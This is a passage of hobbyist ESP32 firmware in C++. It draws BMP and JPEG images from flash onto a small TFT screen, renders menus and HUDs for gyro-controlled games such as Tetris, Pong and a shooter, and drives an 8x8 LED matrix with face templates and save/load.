  if (w <= 0 || h <= 0) { bmpFile.close(); return false; }
  uint8_t buf[48];
  for (int row = 0; row < h; row++) {
    uint32_t pos = bmpImageOffset + (flip ? (bmpHeight - 1 - row) : row) * rowSize;
    if (bmpFile.position() != pos) bmpFile.seek(pos);
    int col = 0;
    while (col < w) {
      int chunk = min(16, w - col);
      int got = bmpFile.read(buf, chunk * 3);
      if (got != chunk * 3) { bmpFile.close(); return false; }
      for (int i = 0; i < chunk; i++) {
        uint8_t b = buf[i * 3 + 0];
        uint8_t g = buf[i * 3 + 1];
        uint8_t r = buf[i * 3 + 2];
        tft.drawPixel(x + col + i, y + row, tft.color565(r, g, b));
      }
      col += chunk;
      yield();
    }
  }
  bmpFile.close();
  return true;
}

static bool tftDrawBmpFromFSScaled(const char *path, int16_t dstX, int16_t dstY, int16_t dstW, int16_t dstH) {
  File bmpFile = LittleFS.open(path, "r");
  if (!bmpFile) return false;
  auto read16 = [&](File &f) -> uint16_t {
    uint16_t result;
    ((uint8_t *)&result)[0] = f.read();
    ((uint8_t *)&result)[1] = f.read();
    return result;
  };
  auto read32 = [&](File &f) -> uint32_t {
    uint32_t result;
    ((uint8_t *)&result)[0] = f.read();
    ((uint8_t *)&result)[1] = f.read();
    ((uint8_t *)&result)[2] = f.read();
    ((uint8_t *)&result)[3] = f.read();
    return result;
  };
  if (read16(bmpFile) != 0x4D42) { bmpFile.close(); return false; }
  (void)read32(bmpFile);
  (void)read32(bmpFile);
  uint32_t bmpImageOffset = read32(bmpFile);
  uint32_t headerSize = read32(bmpFile);
  int32_t bmpWidth = (int32_t)read32(bmpFile);
  int32_t bmpHeight = (int32_t)read32(bmpFile);
  if (read16(bmpFile) != 1) { bmpFile.close(); return false; }
  uint16_t bmpDepth = read16(bmpFile);
  uint32_t bmpCompression = read32(bmpFile);
  if (headerSize < 40 || bmpDepth != 24 || bmpCompression != 0) { bmpFile.close(); return false; }
  bool flip = true;
  if (bmpHeight < 0) { bmpHeight = -bmpHeight; flip = false; }
  uint32_t rowSize = (bmpWidth * 3 + 3) & ~3;

  if (dstW <= 0 || dstH <= 0) { bmpFile.close(); return false; }

  // clamp drawing area to TFT
  if (dstX + dstW <= 0 || dstY + dstH <= 0 || dstX >= tft.width() || dstY >= tft.height()) {
    bmpFile.close(); return false;
  }

  // scaling factors from dest -> source
  float scaleX = (float)bmpWidth / (float)dstW;
  float scaleY = (float)bmpHeight / (float)dstH;

  // temporary buffer to read one source row
  uint8_t *rowBuf = (uint8_t *)malloc(rowSize);
  if (!rowBuf) { bmpFile.close(); return false; }

  for (int dstRow = 0; dstRow < dstH; dstRow++) {
    int srcRow = min<int>((int)(dstRow * scaleY), bmpHeight - 1);
    uint32_t pos = bmpImageOffset + (flip ? (bmpHeight - 1 - srcRow) : srcRow) * rowSize;
    if (bmpFile.position() != pos) bmpFile.seek(pos);
    int got = bmpFile.read(rowBuf, rowSize);
    if (got != (int)rowSize) { free(rowBuf); bmpFile.close(); return false; }

    int drawY = dstY + dstRow;
    if (drawY < 0 || drawY >= tft.height()) continue;

    for (int dstCol = 0; dstCol < dstW; dstCol++) {
      int srcCol = min<int>((int)(dstCol * scaleX), bmpWidth - 1);
      int idx = srcCol * 3;
      uint8_t b = rowBuf[idx + 0];
      uint8_t g = rowBuf[idx + 1];
      uint8_t r = rowBuf[idx + 2];
      int drawX = dstX + dstCol;
      if (drawX < 0 || drawX >= tft.width()) continue;
      tft.drawPixel(drawX, drawY, tft.color565(r, g, b));
    }
    yield();
  }

  free(rowBuf);
  bmpFile.close();
  return true;
}

static void tftDrawBmpViewer() {
  tft.fillScreen(ST77XX_BLACK);
  int16_t bmpW = 0;
  int16_t bmpH = 0;
  int16_t drawX = 0;
  int16_t drawY = 0;
  const char *path = bmpViewPath.length() > 0 ? bmpViewPath.c_str() : BMP_PATH;
  // support viewing JPEGs as well as BMPs
  String sp = String(path);
  sp.toLowerCase();
  if (sp.endsWith(".jpg") || sp.endsWith(".jpeg")) {
    if (!tftDrawJpgFromFS(path)) {
      tft.setTextColor(UI_WARN);
      tft.setTextSize(3);
      tft.setCursor(32, 76);
      tft.print("No JPG");
    }
    return;
  }
  if (bmpGetSize(path, bmpW, bmpH)) {
    // compute scale to fit TFT while preserving aspect ratio
    float sx = (float)tft.width() / (float)bmpW;
    float sy = (float)tft.height() / (float)bmpH;
    float s = min(sx, sy);
    int16_t dstW = (int16_t)((float)bmpW * s + 0.5f);
    int16_t dstH = (int16_t)((float)bmpH * s + 0.5f);
    drawX = (tft.width() - dstW) / 2;
    drawY = (tft.height() - dstH) / 2;
    if (dstW != bmpW || dstH != bmpH) {
      // scaled draw path
      if (!tftDrawBmpFromFSScaled(path, drawX, drawY, dstW, dstH)) {
        tft.setTextColor(UI_WARN);
        tft.setTextSize(3);
        tft.setCursor(32, 76);
        tft.print("No BMP");
      }
      return;
    }
  }
  if (!tftDrawBmpFromFS(path, drawX, drawY)) {
    tft.setTextColor(UI_WARN);
    tft.setTextSize(3);
    tft.setCursor(32, 76);
    tft.print("No BMP");
  }
}

static bool tftDrawJpgFromFS(const char *path) {
  if (!LittleFS.exists(path)) return false;
  File f = LittleFS.open(path, "r");
  if (!f) return false;
  size_t sz = f.size();
  uint8_t *buf = (uint8_t *)malloc(sz);
  if (!buf) { f.close(); return false; }
  size_t got = f.read(buf, sz);
  f.close();
  if (got != sz) { free(buf); return false; }

  uint16_t jw = 0, jh = 0;
  if (TJpgDec.getJpgSize(&jw, &jh, buf, (uint32_t)sz) != JDR_OK) { free(buf); return false; }
  // choose largest power-of-two scale such that decoded size is >= display size if possible
  uint8_t scale = 1;
  while (scale < 8) {
    uint8_t next = scale * 2;
    if ((jw / next) >= (uint16_t)tft.width() && (jh / next) >= (uint16_t)tft.height()) scale = next;
    else break;
  }
  if (scale > 8) scale = 8;
  TJpgDec.setJpgScale(scale);
  uint16_t dw = jw / scale;
  uint16_t dh = jh / scale;

  // compute display scaling to fill TFT while preserving aspect ratio
  float sx = (float)tft.width() / (float)dw;
  float sy = (float)tft.height() / (float)dh;
  cameraDisplayScale = min(sx, sy);
  cameraDisplayW = (int16_t)((float)dw * cameraDisplayScale + 0.5f);
  cameraDisplayH = (int16_t)((float)dh * cameraDisplayScale + 0.5f);
  cameraDisplayX = (int16_t)((tft.width() - cameraDisplayW) / 2);
  cameraDisplayY = (int16_t)((tft.height() - cameraDisplayH) / 2);
  // keep original frame coords too for callback math
  cameraFrameW = dw;
  cameraFrameH = dh;
  cameraFrameX = (int16_t)((tft.width() - (int16_t)dw) / 2);
  cameraFrameY = (int16_t)((tft.height() - (int16_t)dh) / 2);

  // draw via TJpgDec which will invoke the existing JPEG callback (`cameraJpgDraw`) that handles scaling
  TJpgDec.drawJpg(cameraFrameX, cameraFrameY, buf, (uint32_t)sz);
  free(buf);
  return true;
}

static void tftDrawGifStartOrError() {
  if (!LittleFS.exists(GIF_PATH)) {
    tft.fillScreen(ST77XX_BLACK);
    tft.setTextColor(UI_WARN);
    tft.setTextSize(3);
    tft.setCursor(38, 76);
    tft.print("No GIF");
    tft.setTextSize(1);
    tft.setTextColor(UI_ACCENT);
    tft.setCursor(10, 225);
    tft.print("OK/OK+ back ke menu");
  }
}

static void tftDrawCameraStatus(const String &line1, const String &line2) {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(UI_ACCENT);
  tft.setCursor(12, 60);
  tft.print("Camera");
  tft.setTextSize(1);
  tft.setTextColor(UI_TEXT);
  tft.setCursor(12, 92);
  tft.print(line1);
  if (line2.length() > 0) {
    tft.setCursor(12, 110);
    tft.print(line2);
  }
  tft.setTextColor(UI_MUTED);
  tft.setCursor(12, 220);
  tft.print("OK:capture  OK(hold):back");
}

static void tftDrawGameMenu(bool force) {
  if (!force) return;
  tft.fillScreen(UI_BG);
  tft.setTextWrap(false);
  tft.setTextColor(UI_TEXT);
  tft.setTextSize(2);
  tft.setCursor(12, 10);
  tft.print("Game Box");
  tftDrawTopRightDateTime(false);
  tft.drawFastHLine(10, 34, 220, UI_LINE);
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 42);
  tft.print("U/D:pilih OK:masuk OK+:back");

  const char *titles[GAME_ITEM_COUNT] = {"SHOOTER", "TETRIS", "WATER", "PONG"};
  const char *descs[GAME_ITEM_COUNT] = {
    "Memakai gyro, auto fire.",
    "Memakai gyro, U/D rotate.",
    "Air simulasi gyro.",
    "Gyro paddle, first to 5."
  };
  const char *meta[GAME_ITEM_COUNT] = {
    "Infinty level",
    "Line speed up",
    imuOn ? "Ready" : "IMU auto-on",
    "vs AI"
  };

  const uint8_t visibleCount = 3;
  uint8_t firstVisible = tftListFirstVisible(gameMenuIndex, GAME_ITEM_COUNT, visibleCount);
  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= GAME_ITEM_COUNT) break;
    int y = 60 + row * 52;
    bool selected = (i == gameMenuIndex);
    uint16_t fill = selected ? UI_CARD_SEL : UI_CARD;
    uint16_t line = selected ? UI_ACCENT : UI_LINE;
    uint16_t text = selected ? UI_TEXT : UI_MUTED;
    tft.fillRoundRect(12, y, 216, 42, 10, fill);
    tft.drawRoundRect(12, y, 216, 42, 10, line);
    tft.setTextSize(2);
    tft.setTextColor(text);
    tft.setCursor(22, y + 8);
    tft.print(titles[i]);
    tft.setTextSize(1);
    tft.setCursor(124, y + 8);
    tft.print(meta[i]);
    tft.setCursor(22, y + 26);
    tft.print(descs[i]);
  }
  tftDrawListScrollbar(226, 62, 144, GAME_ITEM_COUNT, visibleCount, firstVisible);
}

static void tftDrawShooterHud(bool force) {
  static uint16_t prevLevel = 0xFFFF;
  static uint16_t prevScore = 0xFFFF;
  static uint8_t prevHp = 0xFF;
  static bool prevOver = false;
  uint32_t now = millis();
  if (!force && now - game.lastHudMs < 140) return;
  game.lastHudMs = now;
  if (force) {
    prevLevel = 0xFFFF;
    prevScore = 0xFFFF;
    prevHp = 0xFF;
    prevOver = !game.over;
    tft.fillScreen(UI_BG);
    tft.setTextWrap(false);
    tft.setTextColor(UI_TEXT);
    tft.setTextSize(2);
    tft.setCursor(12, 10);
    tft.print("Space Gyro");
    tft.drawRoundRect(12, 42, 216, 72, 10, UI_LINE);
    tft.drawRoundRect(12, 126, 216, 44, 10, UI_LINE);
    tft.setTextSize(1);
    tft.setTextColor(UI_MUTED);
    tft.setCursor(14, 184);
    tft.print("Miring board geser kapal.");
    tft.setCursor(14, 200);
    tft.print("OK+ back ke game menu.");
  }
  tftDrawTopRightDateTime(true);
  if (force || prevLevel != game.level) {
    prevLevel = game.level;
    tft.fillRect(20, 54, 196, 20, UI_BG);
    tft.setTextSize(2);
    tft.setTextColor(UI_MUTED);
    tft.setCursor(22, 56);
    tft.print("LEVEL");
    tft.setTextColor(UI_TEXT);
    tft.setCursor(120, 56);
    tft.print(game.level);
  }
  if (force || prevScore != game.score) {
    prevScore = game.score;
    tft.fillRect(20, 82, 196, 20, UI_BG);
    tft.setTextSize(2);
    tft.setTextColor(UI_MUTED);
    tft.setCursor(22, 84);
    tft.print("SCORE");
    tft.setTextColor(UI_TEXT);
    tft.setCursor(120, 84);
    tft.print(game.score);
  }
  if (force || prevHp != game.hp) {
    prevHp = game.hp;
    tft.fillRect(20, 136, 196, 24, UI_BG);
    tft.setTextSize(2);
    tft.setTextColor(UI_MUTED);
    tft.setCursor(22, 140);
    tft.print("HP");
    for (uint8_t i = 0; i < 3; i++) {
      uint16_t col = (i < game.hp) ? UI_WARN : UI_LINE;
      tft.fillRoundRect(82 + i * 36, 136, 24, 20, 5, col);
    }
  }
  if (force || prevOver != game.over) {
    prevOver = game.over;
    tft.fillRect(20, 214, 200, 18, UI_BG);
    if (game.over) {
      tft.fillRoundRect(24, 210, 190, 20, 8, UI_WARN);
      tft.setTextColor(ST77XX_BLACK);
      tft.setTextSize(1);
      tft.setCursor(38, 216);
      tft.print("GAME OVER OK ulang");
    }
  }
}

static void tftDrawPongFrame(bool force) {
  const int16_t W = 240, H = 240;
  const int16_t PW = 40, PH = 5;
  const int16_t BS = 5;
  const int16_t PY_PLAYER = H - 22;
  const int16_t PY_AI = 16;
  if (force) {
    tft.fillScreen(ST77XX_BLACK);
    tft.drawFastHLine(0, 0, W, UI_LINE);
    tft.drawFastHLine(0, H - 1, W, UI_LINE);
    tft.drawFastVLine(0, 0, H, UI_LINE);
    tft.drawFastVLine(W - 1, 0, H, UI_LINE);
    for (int16_t x = 0; x < W; x += 10) tft.drawPixel(x, H / 2, UI_LINE);
  }
  // Erase old positions stored as static
  static int16_t prevPX = -1, prevAX = -1, prevBX = -1, prevBY = -1;
  if (prevPX >= 0) tft.fillRect(prevPX, PY_PLAYER, PW, PH, ST77XX_BLACK);
  if (prevAX >= 0) tft.fillRect(prevAX, PY_AI, PW, PH, ST77XX_BLACK);
  if (prevBX >= 0) tft.fillRect(prevBX, prevBY, BS, BS, ST77XX_BLACK);
  // Draw paddles
  int16_t px = constrain((int16_t)pong.playerX, 1, W - PW - 1);
  int16_t ax = constrain((int16_t)pong.aiX, 1, W - PW - 1);
  tft.fillRect(px, PY_PLAYER, PW, PH, UI_ACCENT);
  tft.fillRect(ax, PY_AI, PW, PH, UI_WARN);
  prevPX = px; prevAX = ax;
  // Draw ball
  int16_t bx = constrain((int16_t)pong.ballX, 1, W - BS - 1);
  int16_t by = constrain((int16_t)pong.ballY, 1, H - BS - 1);
  tft.fillRect(bx, by, BS, BS, UI_TEXT);
  prevBX = bx; prevBY = by;
  // Redraw midline dots over erased areas
  int16_t midY = H / 2;
  if ((prevPX >= 0 && PY_PLAYER <= midY + 1 && PY_PLAYER + PH >= midY) ||
      (prevAX >= 0 && PY_AI <= midY + 1 && PY_AI + PH >= midY) ||
      (prevBY >= 0 && prevBY <= midY + 1 && prevBY + BS >= midY)) {
    for (int16_t x = 0; x < W; x += 10) tft.drawPixel(x, midY, UI_LINE);
  }
  // Score
  static uint8_t prevPS = 0xFF, prevAS = 0xFF;
  static bool prevOver = false;
  if (force || prevPS != pong.playerScore || prevAS != pong.aiScore) {
    prevPS = pong.playerScore; prevAS = pong.aiScore;
    tft.fillRect(80, H / 2 - 16, 80, 12, ST77XX_BLACK);
    tft.setTextSize(1); tft.setTextColor(UI_MUTED);
    tft.setCursor(92, H / 2 - 14);
    tft.print(String(pong.aiScore) + " - " + String(pong.playerScore));
  }
  if (force || prevOver != pong.over) {
    prevOver = pong.over;
    if (pong.over) {
      tft.fillRect(40, H / 2 + 20, 160, 28, ST77XX_BLACK);
      tft.fillRoundRect(44, H / 2 + 22, 152, 24, 8, pong.playerScore >= pong.maxScore ? UI_OK : UI_WARN);
      tft.setTextColor(ST77XX_BLACK); tft.setTextSize(1);
      tft.setCursor(52, H / 2 + 30);
      tft.print(pong.playerScore >= pong.maxScore ? "YOU WIN! OK again" : "YOU LOSE  OK again");
    }
  }
  if (force) { prevPS = 0xFF; prevAS = 0xFF; prevOver = false; prevPX = -1; prevAX = -1; prevBX = -1; }
}

static void tftDrawTetrisHud(bool force) {
  static uint16_t prevScore = 0xFFFF;
  static uint16_t prevLines = 0xFFFF;
  static uint8_t prevLevel = 0xFF;
  static bool prevOver = false;
  uint32_t now = millis();
  if (!force && now - tetris.lastHudMs < 140) return;
  tetris.lastHudMs = now;
  if (force) {
    prevScore = 0xFFFF;
    prevLines = 0xFFFF;
    prevLevel = 0xFF;
    prevOver = !tetris.over;
    tft.fillScreen(UI_BG);
    tft.setTextWrap(false);
    tft.setTextColor(UI_TEXT);
    tft.setTextSize(2);
    tft.setCursor(12, 10);
    tft.print("Gyro Tetris");
    tft.drawRoundRect(12, 42, 216, 88, 10, UI_LINE);
    tft.setTextSize(1);
    tft.setTextColor(UI_MUTED);
    tft.setCursor(14, 154);
    tft.print("Gyro geser kiri/kanan.");
    tft.setCursor(14, 170);
    tft.print("UP rotate, DOWN rotate.");
    tft.setCursor(14, 186);
    tft.print("OK+ back ke game menu.");
  }
  tftDrawTopRightDateTime(true);
  if (force || prevLevel != tetris.level) {
    prevLevel = tetris.level;
    tft.fillRect(20, 54, 196, 20, UI_BG);
    tft.setTextSize(2);
    tft.setTextColor(UI_MUTED);
    tft.setCursor(22, 56);
    tft.print("LEVEL");
    tft.setTextColor(UI_TEXT);
    tft.setCursor(124, 56);
    tft.print(tetris.level);
  }
  if (force || prevScore != tetris.score) {
    prevScore = tetris.score;
    tft.fillRect(20, 82, 196, 20, UI_BG);
    tft.setTextSize(2);
    tft.setTextColor(UI_MUTED);
    tft.setCursor(22, 84);
    tft.print("SCORE");
    tft.setTextColor(UI_TEXT);
    tft.setCursor(124, 84);
    tft.print(tetris.score);
  }
  if (force || prevLines != tetris.lines) {
    prevLines = tetris.lines;
    tft.fillRect(20, 108, 196, 20, UI_BG);
    tft.setTextSize(2);
    tft.setTextColor(UI_MUTED);
    tft.setCursor(22, 110);
    tft.print("LINES");
    tft.setTextColor(UI_TEXT);
    tft.setCursor(124, 110);
    tft.print(tetris.lines);
  }
  if (force || prevOver != tetris.over) {
    prevOver = tetris.over;
    tft.fillRect(20, 210, 200, 18, UI_BG);
    if (tetris.over) {
      tft.fillRoundRect(24, 208, 190, 20, 8, UI_WARN);
      tft.setTextColor(ST77XX_BLACK);
      tft.setTextSize(1);
      tft.setCursor(38, 214);
      tft.print("TETRIS OVER  OK ulang");
    }
  }
}

static void tftDrawWaterHud(bool force) {
  static int prevRoll = 9999;
  static int prevPitch = 9999;
  if (force) {
    prevRoll = 9999;
    prevPitch = 9999;
    tft.fillScreen(UI_BG);
    tft.setTextWrap(false);
    tft.setTextColor(UI_TEXT);
    tft.setTextSize(2);
    tft.setCursor(12, 10);
    tft.print("Water Gyro");
    tft.drawRoundRect(12, 42, 216, 80, 10, UI_LINE);
    tft.setTextSize(1);
    tft.setTextColor(UI_MUTED);
    tft.setCursor(14, 150);
    tft.print("Miring board aliran air.");
    tft.setCursor(14, 166);
    tft.print("OK+ back ke game menu.");
  }
  float rollDeg = 0.0f;
  float pitchDeg = 0.0f;
  computeTiltDeg(rollDeg, pitchDeg);
  int rollInt = (int)roundf(rollDeg);
  int pitchInt = (int)roundf(pitchDeg);
  tftDrawTopRightDateTime(true);
  if (force || prevRoll != rollInt || prevPitch != pitchInt) {
    prevRoll = rollInt;
    prevPitch = pitchInt;
    tft.fillRect(20, 56, 196, 48, UI_BG);
    tft.setTextSize(2);
    tft.setTextColor(UI_MUTED);
    tft.setCursor(22, 56);
    tft.print("ROLL");
    tft.setTextColor(UI_TEXT);
    tft.setCursor(116, 56);
    tft.print(rollInt);
    tft.setTextColor(UI_MUTED);
    tft.setCursor(22, 84);
    tft.print("PITCH");
    tft.setTextColor(UI_TEXT);
    tft.setCursor(116, 84);
    tft.print(pitchInt);
  }
}

static void tftEnterSleep() {
  if (isSleepActive()) return;
  gifStop();
  lastSleepMinute = -1;
  if (!sleepModeKeepsScreenOn(sleepMode)) {
    gTftBacklightBeforeSleep = gTftBacklight;
    tft.sendCommand(0x28);
    delay(10);
    tft.sendCommand(0x10);
    delay(120);
    analogWrite(TFT_BLK, 0);
    tftSleeping = true;
    sleepScreenDimmed = false;
  } else if (sleepMode == SLEEP_STANDBY_SCREEN || sleepMode == SLEEP_BMP_CLOCK) {
    gTftBacklightBeforeSleep = gTftBacklight;
    analogWrite(TFT_BLK, (gTftBacklightBeforeSleep + 1) / 2);
    sleepScreenDimmed = true;
  }
  if (sleepMode == SLEEP_BOTH || sleepMode == SLEEP_LED_ONLY || sleepMode == SLEEP_STANDBY_SCREEN || sleepMode == SLEEP_BMP_CLOCK) matrixEnterSleep();
  if (!tftSleeping) tftDrawSleepStateNotice();
  struct tm tmNow;
  if (!tftSleeping && getLocalTime(&tmNow, 0)) lastSleepMinute = tmNow.tm_min;
}

static void tftExitSleep() {
  if (!isSleepActive()) return;
  if (tftSleeping) {
    tft.sendCommand(0x11);
    delay(120);
    tft.sendCommand(0x29);
    delay(10);
    analogWrite(TFT_BLK, gTftBacklightBeforeSleep);
    gTftBacklight = gTftBacklightBeforeSleep;
    blDirty = false;
    tftSleeping = false;
  } else if (sleepScreenDimmed) {
    analogWrite(TFT_BLK, gTftBacklightBeforeSleep);
    gTftBacklight = gTftBacklightBeforeSleep;
    blDirty = false;
  }
  sleepScreenDimmed = false;
  matrixExitSleep();
  lastSleepMinute = -1;
  uiMarkDirty();
  markTftDirty();
}

static void matrixInit() {
  FastLED.addLeds<WS2812, RGB_CONTROL_PIN, GRB>(leds, RGB_COUNT);
  FastLED.setBrightness(gBrightness);
  matrixClearBuffer();
  matrixDirty = true;
}

static void matrixClearBuffer() {
  for (int r = 0; r < 8; r++) {
    for (int c = 0; c < 8; c++) {
      Matrix_Color[r][c] = CRGB::Black;
    }
  }
}

static void matrixClear() {
  matrixClearBuffer();
  matrixDirty = true;
}

static void matrixCommitToPixels() {
  applyBrightnessIfDirty();
  for (int r = 0; r < 8; r++) {
    for (int c = 0; c < 8; c++) {
      leds[r * 8 + c] = Matrix_Color[r][c];
    }
  }
  FastLED.show();
}

static void matrixEnterSleep() {
  matrixSleeping = true;
  fill_solid(leds, RGB_COUNT, CRGB::Black);
  FastLED.show();
}

static void matrixExitSleep() {
  if (!matrixSleeping) return;
  matrixSleeping = false;
  matrixDirty = true;
}

static void matrixFillAll(CRGB col) {
  for (int r = 0; r < 8; r++) {
    for (int c = 0; c < 8; c++) {
      Matrix_Color[r][c] = col;
    }
  }
  matrixDirty = true;
}

static void matrixShowIdleFace() {
  matrixClearBuffer();
  Matrix_Color[2][2] = CRGB(0, 70, 150);
  Matrix_Color[2][5] = CRGB(0, 70, 150);
  Matrix_Color[5][2] = CRGB(0, 30, 80);
  Matrix_Color[5][5] = CRGB(0, 30, 80);
  Matrix_Color[6][3] = CRGB(0, 60, 120);
  Matrix_Color[6][4] = CRGB(0, 60, 120);
  matrixCommitToPixels();
  matrixIdleDirty = false;
}

static void matrixApplyTemplate(MatrixTemplate t) {
  CRGB col = CRGB(RGB_Data[0], RGB_Data[1], RGB_Data[2]);
  matrixClear();
  auto setPixel = [&](int r, int c) { if (r >= 0 && r < 8 && c >= 0 && c < 8) Matrix_Color[r][c] = col; };
  switch (t) {
    case MT_CLEAR: break;
    case MT_SMILEY: setPixel(2,2); setPixel(2,5); setPixel(5,2); setPixel(5,5); setPixel(6,3); setPixel(6,4); break;
    case MT_NEUTRAL: setPixel(2,2); setPixel(2,5); setPixel(1,2); setPixel(1,5); setPixel(5,3); setPixel(5,4); setPixel(4,2); setPixel(4,5); break;
    case MT_LEFT: setPixel(2,1); setPixel(2,4); setPixel(1,2); setPixel(5,3); setPixel(5,4); setPixel(5,5); break;
    case MT_RIGHT: setPixel(2,3); setPixel(2,6); setPixel(1,5); setPixel(5,2); setPixel(5,3); setPixel(5,4); break;
    case MT_CONCERN: setPixel(2,2); setPixel(3,2); setPixel(2,5); setPixel(3,5); setPixel(5,3); setPixel(5,4); setPixel(6,3); setPixel(6,4); setPixel(0,7); break;
    case MT_SLEEPY: setPixel(2,2); setPixel(2,3); setPixel(2,5); setPixel(2,6); setPixel(5,3); setPixel(5,4); setPixel(0,6); setPixel(1,7); break;
  }
  matrixDirty = true;
}

static MatrixTemplate parseTemplate(const String &s) {
  if (s == "clear") return MT_CLEAR;
  if (s == "smiley") return MT_SMILEY;
  if (s == "neutral") return MT_NEUTRAL;
  if (s == "left") return MT_LEFT;
  if (s == "right") return MT_RIGHT;
  if (s == "concern") return MT_CONCERN;
  if (s == "sleepy") return MT_SLEEPY;
  return MT_SMILEY;
}

static int fromHex(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return 10 + (c - 'a');
  if (c >= 'A' && c <= 'F') return 10 + (c - 'A');
  return -1;
}

static String hex2(uint8_t v) {
  const char *h = "0123456789ABCDEF";
  String out;
  out.reserve(2);
  out += h[v >> 4];
  out += h[v & 0xF];
  return out;
}

static String matrixToHex384() {
  String s;
  s.reserve(64 * 6);
  for (int r = 0; r < 8; r++) {
    for (int c = 0; c < 8; c++) {
      CRGB p = Matrix_Color[r][c];
      s += hex2(p.r);
      s += hex2(p.g);
      s += hex2(p.b);
    }
  }
  return s;
}

static bool matrixFromHex384(const String &s) {
  if (s.length() != 384) return false;
  for (int i = 0; i < 64; i++) {
    int base = i * 6;
    int r1 = fromHex(s[base + 0]);
    int r2 = fromHex(s[base + 1]);
    int g1 = fromHex(s[base + 2]);
    int g2 = fromHex(s[base + 3]);
    int b1 = fromHex(s[base + 4]);
    int b2 = fromHex(s[base + 5]);
    if (r1 < 0 || r2 < 0 || g1 < 0 || g2 < 0 || b1 < 0 || b2 < 0) return false;
    uint8_t rr = (uint8_t)((r1 << 4) | r2);
    uint8_t gg = (uint8_t)((g1 << 4) | g2);
    uint8_t bb = (uint8_t)((b1 << 4) | b2);
    Matrix_Color[i / 8][i % 8] = CRGB(rr, gg, bb);
  }
  matrixDirty = true;
  return true;
}

static bool matrixSaveToFS() {
  File f = LittleFS.open(MATRIX_PATH, "w");
  if (!f) return false;
  size_t n = f.write((const uint8_t *)Matrix_Color, sizeof(Matrix_Color));
  f.close();
  return n == sizeof(Matrix_Color);
}

static bool matrixLoadFromFS() {
  if (!LittleFS.exists(MATRIX_PATH)) return false;
  File f = LittleFS.open(MATRIX_PATH, "r");
  if (!f) return false;
  size_t n = f.read((uint8_t *)Matrix_Color, sizeof(Matrix_Color));
  f.close();
  if (n != sizeof(Matrix_Color)) return false;
  matrixDirty = true;
  matrixIdleDirty = false;
  return true;
}

static void matrixCaptureScene() {
  memcpy(matrixSceneBackup, Matrix_Color, sizeof(Matrix_Color));
  matrixSceneBackupValid = true;
}

static void matrixRestoreScene() {
  if (!matrixSceneBackupValid) return;
  memcpy(Matrix_Color, matrixSceneBackup, sizeof(Matrix_Color));
  matrixDirty = true;
  matrixIdleDirty = false;
}

static void matrixRenderGame() {
  fill_solid(leds, RGB_COUNT, CRGB::Black);
  for (uint8_t i = 0; i < MAX_PLAYER_BULLETS; i++) {
    if (playerBullets[i].active && playerBullets[i].x >= 0 && playerBullets[i].x < 8 && playerBullets[i].y >= 0 && playerBullets[i].y < 8) leds[playerBullets[i].y * 8 + playerBullets[i].x] = CRGB::White;
  }
  for (uint8_t i = 0; i < MAX_ENEMY_BULLETS; i++) {
    if (enemyBullets[i].active && enemyBullets[i].x >= 0 && enemyBullets[i].x < 8 && enemyBullets[i].y >= 0 && enemyBullets[i].y < 8) leds[enemyBullets[i].y * 8 + enemyBullets[i].x] = CRGB(255, 80, 0);
  }
  for (uint8_t i = 0; i < MAX_ENEMIES; i++) {
    if (!enemies[i].active) continue;
    CRGB col = (enemies[i].hp >= 3) ? CRGB(255, 0, 180) : (enemies[i].hp == 2 ? CRGB(255, 90, 0) : CRGB(255, 0, 0));
    if (enemies[i].x >= 0 && enemies[i].x < 8 && enemies[i].y >= 0 && enemies[i].y < 8) leds[enemies[i].y * 8 + enemies[i].x] = col;
  }
  CRGB shipColor = game.over ? ((((millis() / 150) % 2) != 0) ? CRGB::Red : CRGB::Black) : CRGB(0, 170, 255);
  leds[PLAYER_Y * 8 + game.shipX] = shipColor;
  applyBrightnessIfDirty();
  FastLED.show();
}

static void matrixRenderTetris() {
  fill_solid(leds, RGB_COUNT, CRGB::Black);
  for (int y = 0; y < 8; y++) {
    for (int x = 0; x < 8; x++) {
      uint8_t cell = tetris.board[y][x];
      if (cell != 0) leds[y * 8 + x] = tetrisColors[cell];
    }
  }
  if (tetris.active && !tetris.over) {
    for (int i = 0; i < 4; i++) {
      int px = tetris.x + tetrisShapeXY[tetris.pieceType][tetris.rotation][i][0];
      int py = tetris.y + tetrisShapeXY[tetris.pieceType][tetris.rotation][i][1];
      if (px >= 0 && px < 8 && py >= 0 && py < 8) leds[py * 8 + px] = tetrisColors[tetris.pieceType + 1];
    }
  }
  applyBrightnessIfDirty();
  FastLED.show();
}

static void gameClearObjects() {
  memset(playerBullets, 0, sizeof(playerBullets));
  memset(enemyBullets, 0, sizeof(enemyBullets));
  memset(enemies, 0, sizeof(enemies));
}

static void gameReset() {
  game.active = true;
  game.over = false;
  game.shipX = 3;
  game.hp = 3;
  game.score = 0;
  game.kills = 0;
  game.level = 1;
  game.lastShipMoveMs = 0;
  game.lastFireMs = 0;
  game.lastBulletStepMs = 0;
  game.lastEnemyBulletStepMs = 0;
  game.lastEnemyStepMs = 0;
  game.lastEnemySpawnMs = 0;
  game.lastEnemyFireMs = 0;
  game.lastHudMs = 0;
  gameClearObjects();
}

static void gameEnterMenu() {
  if (waterMode) waterMode = false;
  if (!matrixSceneBackupValid) matrixCaptureScene();
  game.active = false;
  game.over = false;
  tetrisStop();
  pongStop();
  gameView = GAME_VIEW_MENU;
  matrixRestoreScene();
  enterMode(APP_GAME);
  tftDrawGameMenu(true);
}

static void gameStartShooter() {
  if (!imuOn) {
    QMI8658_SetEnabled(true);
    (void)imuSaveToFS();
  }
  waterMode = false;
  if (!matrixSceneBackupValid) matrixCaptureScene();
  gameReset();
  gameView = GAME_VIEW_SHOOTER;
  enterMode(APP_GAME);
  tftDrawShooterHud(true);
}

static void gameStop(bool backToUi) {
  game.active = false;
  game.over = false;
  gameClearObjects();
  tetrisStop();
  pongStop();
  waterMode = false;
  matrixRestoreScene();
  if (backToUi) {
    matrixSceneBackupValid = false;
    exitToUi();
  } else {
    gameView = GAME_VIEW_MENU;
    enterMode(APP_GAME);
    tftDrawGameMenu(true);
  }
}

static uint32_t gameSpawnIntervalMs() {
  int value = 900 - (int)game.level * 45;
  if (value < 220) value = 220;
  return (uint32_t)value;
}

static uint32_t gameEnemyStepIntervalMs() {
  int value = 620 - (int)game.level * 22;
